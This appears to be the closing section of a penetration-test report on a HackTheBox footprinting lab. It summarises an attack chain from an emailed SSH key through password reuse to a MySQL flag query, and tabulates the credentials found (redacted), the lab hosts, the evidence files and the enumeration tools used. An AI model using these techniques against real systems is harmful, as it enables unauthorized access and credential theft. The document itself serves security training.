9. **INBOX email** from admin contained SSH private key
10. **SSH connection** with extracted key granted shell as XXXXXX
11. **/etc/passwd** showed mysql user (UID 114) - database installed
12. **MySQL login** successful using XXXXXX:XXXXXXXXXXXX (password reuse)
13. **Database enum** found cusXXXXXX "users" database
14. **SQL query** retrieved HTB:XXXXXXXXXXXXXXXXXXXXX from users.users table

---

# Appendices

## Appendix A: Discovered Credentials Summary

| System | Username | Password | Discovery Method | Evidence |
| ------ | -------- | -------- | ---------------- | -------- |
| NIXEASY | XXXXXX | XXXXXX | Provided | [tasks.md](tasks.md) |
| NIXEASY | XXXXXX | SSH Private Key | FTP exfiltration | [ftp.log](scans/ftp.log) |
| WINMEDIUM | XXXXXX | XXXXXXXXX | NFS ticket file | [nfs_ticket_XXXXXXXXX.txt](scans/nfs_ticket_XXXXXXXXX.txt) |
| WINMEDIUM | sa | XXXXXX@XXXXXX | SMB share file | [devshare_listing.txt](scans/devshare_listing.txt) |
| WINMEDIUM | HTB | [from SQL] | SQL Server query | [htb_credential_discovery_walkthrough.md](logs/htb_credential_discovery_walkthrough.md) |
| NIXHARD | XXXXXX | XXXXXXXXXXXX | SNMP MIB | [snmp.log](scans/snmp.log) |
| NIXHARD | XXXXXX | SSH Private Key | IMAP email | [imap_pop3.log](scans/imap_pop3.log) |
| NIXHARD | HTB | XXXXXXXXXXXXXXXXXXXXX | MySQL database | [ssh_connection.log](logs/ssh_connection.log) |

## Appendix B: Network Infrastructure Discovered

**Source:** [dig.log](scans/dig.log) - Zone Transfer Results

| Hostname | IP Address | Purpose (INFERRED) |
| -------- | ---------- | ------------------ |
| inlanefreight.htb | - | Primary domain |
| ns.inlanefreight.htb | 10.129.34.136 | Name server |
| app.inlanefreight.htb | 10.129.18.15 | Application server |
| internal.inlanefreight.htb | 10.129.1.6 | Internal systems |
| mail1.inlanefreight.htb | 10.129.18.201 | Mail server |
| smtp.web.dev.inlanefreight.htb | - | Development SMTP |
| web.dev.inlanefreight.htb | - | Development web |

**SPF Authorized IPs:** 10.129.124.8, 10.129.127.2, 10.129.42.106

## Appendix C: Evidence Files Index

### Scan Logs (`./cases/footprinting/lab/scans/`)

| File | Description | Sections |
| ---- | ----------- | -------- |
| nmap.log | All nmap scan results | 1, 2, 3 |
| dig.log | DNS enumeration | 1 |
| ftp.log | FTP access and key exfiltration | 1 |
| ssh.log | SSH connection logs | 1, 3 |
| smbclient.log | SMB enumeration | 2 |
| smbmap.log | SMB share mapping | 2 |
| rpcclient.log | RPC enumeration | 2 |
| winrm.log | WinRM user enumeration | 2 |
| nfs.log | NFS mount operations | 2 |
| mssql.log | SQL Server connection attempts | 2 |
| imap_pop3.log | Email service enumeration | 3 |
| snmp.log | SNMP enumeration and credentials | 3 |
| nfs_ticket_XXXXXXXXX.txt | Ticket with XXXXXX credentials | 2 |
| devshare_listing.txt | SMB share with SA credentials | 2 |
| XXXXXX_ssh_key.txt | XXXXXX's SSH private key | 3 |

### Walkthrough Documents (`./cases/footprinting/lab/logs/`)

| File | Description | Section |
| ---- | ----------- | ------- |
| credential_exploitation_walkthrough.md | Section 1 complete walkthrough | 1 |
| htb_user_discovery_walkthrough.md | HTB user enumeration on WINMEDIUM | 2 |
| htb_credential_discovery_walkthrough.md | Section 2 SQL Server walkthrough | 2 |
| mysql_enumeration_walkthrough.md | Section 3 MySQL walkthrough | 3 |
| ssh_connection.log | Section 3 SSH session and MySQL output | 3 |

## Appendix D: Tools Used

| Tool | Version | Purpose |
| ---- | ------- | ------- |
| Nmap | 7.98 | Port scanning, service enumeration, NSE scripts |
| dig | 9.20.15-2-Debian | DNS enumeration and zone transfers |
| FTP client | - | File transfer and key exfiltration |
| OpenSSH | - | SSH connections with keys |
| smbclient | - | SMB share enumeration and access |
| smbmap | - | SMB permission mapping |
| rpcclient | - | Windows RPC enumeration |
| netexec | - | WinRM/SMB user enumeration |
| enum4linux | 0.9.1 | Windows/Samba enumeration |
| onesixtyone | - | SNMP community string bruteforce |
| snmpwalk | - | SNMP MIB enumeration |
| curl | - | IMAP/POP3 protocol interaction |
| openssl s_client | - | SSL/TLS certificate analysis |
| MySQL client | - | Database enumeration |
| mssqlclient.py | Impacket 0.13.0 | SQL Server connection attempts |
| xfreerdp | - | Remote Desktop access |

---

## Report Classification

**Classification:** CONFIDENTIAL - Client Penetration Test Results  
**Distribution:** Inlanefreight Ltd IT Security Team Only  
**Retention:** Per client data retention policy

---

## Disclaimer

This penetration test was conducted with explicit authorization from Inlanefreight Ltd. All testing activities were performed within the defined scope and rules of engagement. The findings in this report are based on the state of the systems at the time of testing and may change over time.

All findings labeled as "INFERRED" or "ASSUMED" represent professional analysis based on available evidence and may require additional verification.

---

**Report Generated:** January 2, 2026  
**Testing Period:** January 1-2, 2026  
**Classification:** CONFIDENTIAL
